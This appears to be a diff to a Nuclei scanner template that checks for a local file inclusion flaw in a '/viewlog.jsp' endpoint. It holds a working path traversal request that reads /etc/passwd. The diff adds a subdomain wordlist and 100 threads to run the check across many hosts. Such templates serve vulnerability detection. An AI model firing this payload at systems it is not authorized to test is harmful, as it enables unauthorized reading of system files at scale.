@@ -6,7 +6,8 @@ info:
   severity: high
   tags: ecoa,lfi
 requests:
-- matchers:
+- attack: sniper
+  matchers:
   - condition: and
     regex:
     - root:.*:0:0
@@ -15,12 +16,15 @@ requests:
     - 200
     type: status
   matchers-condition: and
+  payloads:
+    Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
   raw:
   - 'POST /viewlog.jsp HTTP/1.1
 
-    Host: {{Hostname}}
+    Host: {{Subdomains}}
 
 
     yr=2021&mh=6&fname=../../../../../../../../etc/passwd
 
     '
+  threads: 100
